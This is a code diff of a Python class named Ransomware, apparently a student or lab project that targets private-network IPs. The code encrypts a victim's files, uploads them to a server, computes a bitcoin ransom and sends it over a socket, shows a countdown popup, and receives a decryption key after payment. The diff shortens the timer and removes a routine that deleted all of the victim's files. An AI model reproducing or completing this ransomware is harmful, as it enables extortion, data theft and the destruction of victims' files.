@@ -14,7 +14,7 @@ import requests
 import re
 
 class Ransomware: 
-    SERVER_IP = "192.168.56.110"
+    SERVER_IP = "10.0.2.5"
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
@@ -123,6 +123,8 @@ class Ransomware:
         
         if (change == bitcoin_needed):
             return True
+        else:
+            return False
 
 
     # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
@@ -194,13 +196,15 @@ class Ransomware:
                     
         print("terminated")
 
-    def calculate_and_send_bitcoin_needed(self, size_of_files):
-        #subin equation: 
-        bitcoin_needed = str((size_of_files/10000000000) * 0.0002)
-        self._socket.sendall(base64.b64encode(bitcoin_needed.encode("utf-8")))
+
+    def calulate_bitcoin(self, size_of_files):
+        global bitcoin_needed
+        bitcoin_needed = str((size_of_files/10000000000) * 0.00005)
+
+
  
         
-        
+    
 
 
     # Encrypt all the safe to encrypt files on a victims pc
@@ -230,14 +234,10 @@ class Ransomware:
         print("Number of files encrypted: " + str(number_of_files))
         print("Total size of files: " + str(size_of_files))
         
-        self.calculate_and_send_bitcoin_needed(size_of_files)
+        #Update the amount of bitcoin that we want glboabbly
+        self.calulate_bitcoin(size_of_files)
 
-    def delete_all_files(self, directory):
-        dir_list = self.list_safe_directories(directory)
-        for dir in dir_list:
-            for file in self.get_files_in_dir(dir):
-                file_path=os.path.join(dir, file)
-                os.remove(file_path)
+
 
 
     def decrypt_file(self, file_path, key):
@@ -294,11 +294,12 @@ class Ransomware:
         t1 = threading.Thread(target=self.encrypt_and_send_all_files(self._directory, key))
         t1.start()
 
-
+        #Send the amount of bitcoins we need to have to server
+        self._socket.sendall(base64.b64encode(bitcoin_needed.encode("utf-8")))
 
 
         start_time = time.time()
-        remaining_time = 86400 #24 hours 
+        remaining_time = 70 #24 hours 
 
 
 
@@ -318,48 +319,44 @@ class Ransomware:
 
             # Update the remaining time
             elapsed_time = time.time() - start_time
-            remaining_time = 86400 - elapsed_time
+            remaining_time = 70 - elapsed_time
             time.sleep(1)
             popup.send_signal(signal.SIGTERM)
 
 
 
-        #User has paid before the time ran out
-        if (self.check_if_user_has_paid()):
-            # Waits until all the files has been uploaded before processing the payment
-            t1.join()
-            popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
-        
-            """ Receiving the private key. """
-            filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-            print(f"[RECV] Receiving the private key.")
-            key = open(filename, "w")
-            self._socket.sendall("Private key filename received.".encode("utf-8"))
- 
-            """ Receiving the private key from the server. """
-            data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
-            key.write(data)
-          
-            print(f"[RECV] Receiving the private key data.")
-            key.write(data)
-            self._socket.sendall("File data received".encode("utf-8"))
-        
-            """ Closing the file. """
-            key.close()
+            #User has paid before the time ran out
+            if (self.check_if_user_has_paid()):
+                # Waits until all the files has been uploaded before processing the payment
+                t1.join()
+                
+                popup = subprocess.Popen(["zenity", "--info", "--text", "Payment has been received! \n Decrypting all files.","--width", "400", "--height", "200" ])
+            
+                """ Receiving the private key. """
+                filename = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+                print(f"[RECV] Receiving the private key.")
+                key = open(filename, "w")
+                self._socket.sendall("Private key filename received.".encode("utf-8"))
+    
+                """ Receiving the private key from the server. """
+                data = base64.b64decode(self._socket.recv(1024)).decode("utf-8")
+                key.write(data)
+            
+                print(f"[RECV] Receiving the private key data.")
+                key.write(data)
+                self._socket.sendall("File data received".encode("utf-8"))
+            
+                """ Closing the file. """
+                key.close()
 
-            #Read the private key from the server
-            #I am not sure where to put this above, so I will leave it here for now
-            with open("private_key.pem", "rb") as key_content:
-                key = rsa.PrivateKey.load_pkcs1(key_content.read())
-        
-            # self.decrypt_all_files(home, key)
-        
-            #TODO: Implement code to delete all the files that are stored on the server
-
-        else: # Timer has run out
-            #TODO: Implement file deletion and internet publication code.
-            print("timer ran out ")
-            self.delete_all_files(self._directory)
+                #Read the private key from the server
+                #I am not sure where to put this above, so I will leave it here for now
+                with open("private_key.pem", "rb") as key_content:
+                    key = rsa.PrivateKey.load_pkcs1(key_content.read())
+            
+                # self.decrypt_all_files(home, key)
+            
+                #TODO: Implement code to delete all the files that are stored on the server
 
 
 
@@ -374,6 +371,7 @@ if __name__ == '__main__':
     # Initialize Ransomware
     ransomware = Ransomware('tsoh', 'lacol', 729000000, home)
     
+
     # Start the attack
     ransomware.execute_attack()
 
